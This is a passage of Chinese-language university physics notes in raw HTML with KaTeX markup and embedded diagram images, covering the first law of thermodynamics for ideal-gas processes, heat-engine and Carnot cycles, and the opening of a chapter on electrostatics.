class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">μ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>表示在等容过程中，1 mol 气体升高单位温度所吸收或放出的热量，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mi>P</mi></msub><mo>=</mo><msub><mi>C</mi><mrow><mi>V</mi><mo separator="true">,</mo><mi>μ</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>T</mi><mn>2</mn></msub><mo>−</mo><msub><mi>T</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q_P=C_{V, μ}(T_2-T_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">μ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br>等压摩尔热容$C_{P, μ} <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>表示在等压过程中，</mtext><mn>1</mn><mi>m</mi><mi>o</mi><mi>l</mi><mtext>气体升高单位温度所吸收的热量，</mtext></mrow><annotation encoding="application/x-tex">表示在等压过程中，1 mol 气体升高单位温度所吸收的热量，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord cjk_fallback">表示在等压过程中，</span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">气体升高单位温度所吸收的热量，</span></span></span></span>Q<em>P=C</em>{P, μ} (T_2-T_1)$</p><h2 id="热力学第一定律对理想气体等值过程的应用">热力学第一定律对理想气体等值过程的应用</h2><h3 id="热力学第一定律">热力学第一定律</h3><p>系统吸收的热量，转变成系统的内能和系统对外做的功。 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo>−</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">Q=(E_2-E_1)+W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></p><ol><li>注意内能增量、功、热量的正负规定。</li><li>热力学第一定律是从实验中总结出来的，第一类永动机不能制成。</li></ol><h3 id="内能增量、功、热量的正负">内能增量、功、热量的正负</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648871206-56e204f9-0004-4323-bf1c-c0b421bb0616.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=424&amp;id=ue8a7a946&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=530&amp;originWidth=664&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22740&amp;status=done&amp;style=none&amp;taskId=uf5f0bdc2-2901-4e2d-b95c-15bde65ce78&amp;title=&amp;width=531.2" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648921850-bb417510-d2d8-4a3e-9efe-9ccbe9512574.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=237&amp;id=u9db25ab6&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=296&amp;originWidth=613&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17170&amp;status=done&amp;style=none&amp;taskId=uf72676ea-e7e5-4065-a7e2-60ffb558467&amp;title=&amp;width=490.4" alt="图片.png"></p><h3 id="等容过程">等容过程</h3><ol><li>过程特点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>V</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">dV=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li>过程方程：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>P</mi><mi>T</mi></mfrac><mo>=</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">\frac{P}{T}=C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2173em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648649689264-130b2f03-7edc-4d65-ad2f-03a940463806.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=454&amp;id=u24085406&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=567&amp;originWidth=885&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=60654&amp;status=done&amp;style=none&amp;taskId=ua145d30a-0cd4-4b8d-863b-443f2232e85&amp;title=&amp;width=708" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648649725779-83621f41-d1bb-4c6a-a3c6-4d177d0f3e60.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=430&amp;id=u7859fbea&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=538&amp;originWidth=913&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29796&amp;status=done&amp;style=none&amp;taskId=ud8165ff9-de4c-4f23-a67e-55661b3f5c8&amp;title=&amp;width=730.4" alt="图片.png"></p><h3 id="等压过程">等压过程</h3><ol><li>过程特点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>P</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">dP=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li>过程方程：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>V</mi><mi>T</mi></mfrac><mo>=</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">\frac{V}{T}=C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2173em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648649888360-0410215e-75d1-42e0-9c33-dc946a85f2f9.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=462&amp;id=udae5010a&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=578&amp;originWidth=886&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=67254&amp;status=done&amp;style=none&amp;taskId=uc30448c2-7375-4b26-b72e-483ba78df34&amp;title=&amp;width=708.8" alt="图片.png"></p><h3 id="等温过程">等温过程</h3><ol><li>过程特点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>T</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">dT=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li>过程方程：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>V</mi><mo>=</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">{P}{V}=C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648704295268-a2dfb4de-f6df-4c08-b11d-4dba1c914574.png#clientId=ud0c9c756-5f3f-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=508&amp;id=u0ef7b7d0&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=635&amp;originWidth=783&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=43445&amp;status=done&amp;style=none&amp;taskId=u738933ed-64d7-4273-82dc-a2e57e59e74&amp;title=&amp;width=626.4" alt="图片.png"></p><h3 id="绝热过程">绝热过程</h3><p>绝热过程系统对外作功，全部是靠降低系统内能实现的。</p><ol><li>过程特点：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>Q</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">dQ=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li>绝热过程：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mn>0</mn><mi>W</mi><mo>=</mo><mi mathvariant="normal">Δ</mi><mi>E</mi></mrow><annotation encoding="application/x-tex">Q=0          W=ΔE</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648705068275-087d2050-db20-4d79-babe-5452b5cd9b8b.png#clientId=uc3475aeb-4637-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=521&amp;id=u867805da&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=651&amp;originWidth=905&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=59295&amp;status=done&amp;style=none&amp;taskId=u67ce0b5e-831a-4161-a5e8-4db49f3a176&amp;title=&amp;width=724" alt="图片.png"></p><h2 id="循环过程">循环过程</h2><h3 id="循环效率">循环效率</h3><p>系统经过一系列变化状态过程后，又回到原来的状态的过程叫热力学循环过程 。<br>特征：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>E</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">ΔE=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span><br>热力学第一定律 ：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">Q=W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span><br>净功：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>=</mo><msub><mi>Q</mi><mn>1</mn></msub><mo>−</mo><msub><mi>Q</mi><mn>2</mn></msub><mo>=</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">W=Q_1-Q_2=Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></p><ol><li>热机（正循环）W&gt;0 效率：在一次循环中，工质对外做的净功占它吸收的热量的比率</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648647999325-f5fc20de-7001-4109-a6d6-e5bcb449b758.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=100&amp;id=uf7847376&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=125&amp;originWidth=647&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=7561&amp;status=done&amp;style=none&amp;taskId=ub93f5361-b156-405b-9bff-aeee4e75c9d&amp;title=&amp;width=517.6" alt="图片.png"></p><ol start="2"><li>致冷机（逆循环）W&lt;0 致冷系数：对工质做一份功可从低温热源提取多少份热</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648023986-2aed70e2-564a-465a-b8c3-e1934a8fe3d8.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=107&amp;id=u52cd966d&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=134&amp;originWidth=768&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=8559&amp;status=done&amp;style=none&amp;taskId=ua6b5fc38-b9ef-4dc7-8d81-1b77b4e95a9&amp;title=&amp;width=614.4" alt="图片.png"></p><h3 id="卡诺循环">卡诺循环</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648148534-e9707102-7a3e-49b1-b797-d6befac09e87.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=86&amp;id=uc1c569ef&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=107&amp;originWidth=787&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=8805&amp;status=done&amp;style=none&amp;taskId=u9c6cc232-0442-4aeb-9b8a-1db6653778e&amp;title=&amp;width=629.6" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648185835-99482d90-c16c-4793-87dd-611d1cdeb24f.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=456&amp;id=ua5871b8f&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=570&amp;originWidth=870&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57375&amp;status=done&amp;style=none&amp;taskId=ub99f3142-1a94-49cf-8423-ddb8a506ae6&amp;title=&amp;width=696" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648198633-076768af-7153-4704-83d9-5d65561f070b.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=534&amp;id=ue4a961b2&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=667&amp;originWidth=916&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=63983&amp;status=done&amp;style=none&amp;taskId=uc897263f-9cd5-4f41-a313-e72fcce80f6&amp;title=&amp;width=732.8" alt="图片.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648648219773-a8ce3e60-d178-4652-86c0-9975a5863437.png#clientId=u99aaaeaf-45d2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=528&amp;id=ub4b840ab&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=660&amp;originWidth=947&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=77249&amp;status=done&amp;style=none&amp;taskId=ue16c8852-936a-4c28-9ba0-f81be47c755&amp;title=&amp;width=757.6" alt="图片.png"></p><h1>第五章静电场</h1><h2 id="电荷库仑定律">电荷库仑定律</h2><ol><li>电荷是一种物质，有两类，正电荷、负电荷。同性相斥、异性相吸。</li><li>起电方法：摩擦起电 感应起电。</li><li>电荷的量子化：物体带电量都是基本电荷的整数倍。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648721187573-1a58f79c-e66e-440f-b7e6-9538411c6bfd.png#clientId=uf9f217a2-3aec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=482&amp;id=udb6c5503&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=602&amp;originWidth=883&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=42673&amp;status=done&amp;style=none&amp;taskId=u7fce0d38-9a6b-4b04-9681-2efaa67b886&amp;title=&amp;width=706.4" alt="图片.png"></p><h2 id="电场强度">电场强度</h2><h3 id="电场强度-E">电场强度 E</h3><p>描写电场性质的物理量。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648724445299-8d55bd19-0dc8-448d-b68c-f00d3c83dd1b.png#clientId=uf9f217a2-3aec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=234&amp;id=ua077f0e8&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=293&amp;originWidth=889&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22864&amp;status=done&amp;style=none&amp;taskId=ub0effb17-7fa6-4cbf-9fd7-ba47347622f&amp;title=&amp;width=711.2" alt="图片.png"></p><h3 id="场强叠加原理">场强叠加原理</h3><p>点电荷系：空间某点的场强为各个点电荷在该点产生的场强的矢量合。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648725034747-c0429df5-c85c-4c57-a022-c221fc56f54a.png#clientId=uf9f217a2-3aec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=259&amp;id=ud578c16c&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=324&amp;originWidth=688&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9124&amp;status=done&amp;style=none&amp;taskId=ud502f50b-fdd0-4eb8-a198-af5e1061e17&amp;title=&amp;width=550.4" alt="图片.png"></p><h3 id="连续带电体场强的计算">连续带电体场强的计算</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648724951701-f04c4000-6298-4709-9917-7736c0ff83aa.png#clientId=uf9f217a2-3aec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=453&amp;id=u9d6a3546&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=566&amp;originWidth=930&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=88620&amp;status=done&amp;style=none&amp;taskId=uf97287d7-95b8-4b7c-851f-be15beb5a5b&amp;title=&amp;width=744" alt="图片.png"></p><h3 id="解题思路及应用举例">解题思路及应用举例</h3><p><img 